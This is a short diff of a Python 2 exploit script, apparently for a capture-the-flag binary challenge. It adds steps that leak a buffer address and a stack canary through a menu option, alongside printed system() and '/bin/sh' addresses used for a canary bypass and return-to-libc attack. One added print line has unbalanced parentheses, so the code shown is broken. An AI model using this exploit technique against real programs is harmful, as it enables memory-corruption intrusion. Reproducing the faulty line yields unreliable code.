@@ -152,6 +152,7 @@ if local:
     print green("System: "),hex(system)
     print green("Binsh: "),hex(binsh)
     print green("Canary: "),hex(canary)
+    
     #fucking exploit
     p.recvul(">")
     p.sendl("4")
@@ -194,7 +195,12 @@ else:
     p.recvl()
     buf = p.recvl()
     buf = int(buf[145:156],16)
-    print buf
+    p.recvul(">")
+    p.sendl("6")
+    canary = int(viewpaper(p),16)
+    print green(("Buffer: "),hex(buf)
+    print green("Canary: "),hex(canary)
+
     #fucking exploit
     p.recvul(">")
     p.sendl("4")
